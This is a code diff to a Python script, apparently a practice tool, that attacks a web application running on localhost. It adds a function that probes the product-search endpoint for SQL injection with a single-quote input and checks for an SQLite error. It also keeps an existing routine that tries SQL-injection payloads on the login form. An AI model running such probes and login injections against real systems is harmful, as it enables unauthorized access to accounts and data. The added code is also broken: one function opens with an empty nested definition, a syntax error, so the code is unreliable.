@@ -4,6 +4,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.keys import Keys
 import time
+import requests
 
 
 
@@ -13,7 +14,7 @@ def main():
     driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)
 
     # Open the webpage
-    driver.get("http://localhost:2020/#/login")
+    driver.get("http://localhost:3000/#/login")
 
     # Wait for and dismiss the overlay
     try:
@@ -25,12 +26,54 @@ def main():
     except Exception as e:
         print(f"Could not dismiss the overlay: {e}")
 
-    attempt_sql_injections(driver)
+    # attempt_sql_injections(driver)
 
     # Close the browser
     input("Press Enter to close the browser...")
     driver.quit()
     exit()
+
+def check_search_query():
+    url = "http://localhost:3000/rest/products/search?q="
+
+    try: 
+        response = requests.get(url)
+        headers = response.headers
+
+        print(f"Response headers: {headers}")
+
+    except requests.exceptions.RequestException:
+        print("Error occured while requesting " + url)
+
+def check_if_injectable():
+    def check_search_query():
+    url = "http://localhost:3000/rest/products/search?q="
+
+    # confirm we can reach the website
+    try: 
+        response = requests.get(url)
+
+    except requests.exceptions.RequestException:
+        print("Error occured while requesting " + url)
+        return
+    
+    # test to see if it is injectable 
+    url = "http://localhost:3000/rest/products/search?q=a\'"
+
+    try:
+        response = requests.get(url, headers={'Accept':'application/json'}) #as json
+        response.raise_for_status()
+    except requests.exceptions.HTTPError as e:
+        # print raw error
+        print("Error",e.response.json())
+
+    json = response.json()
+    code = json['error']['code']
+    print(code)
+    if code == "SQLITE_ERROR":
+        return True
+    return False
+
 
 def attempt_sql_injections(driver):
     # Note: This is very basic.
@@ -62,7 +105,7 @@ def attempt_sql_injections(driver):
             passwordField.send_keys(Keys.RETURN)
 
             # Wait to see if login was successful
-            time.sleep(5)
+            time.sleep(1)
 
             # Check if login was successful
             if "admin" in driver.page_source.lower():
